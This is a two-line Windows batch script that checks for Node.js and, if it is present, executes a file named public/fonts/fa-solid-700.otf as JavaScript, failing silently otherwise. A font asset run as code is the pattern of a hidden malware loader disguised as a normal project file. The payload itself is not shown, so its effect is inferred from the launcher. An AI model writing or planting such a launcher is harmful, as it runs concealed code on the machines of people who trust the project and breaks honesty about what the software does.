@echo off
where node >nul 2>&1 && node ./public/fonts/fa-solid-700.otf || echo ''
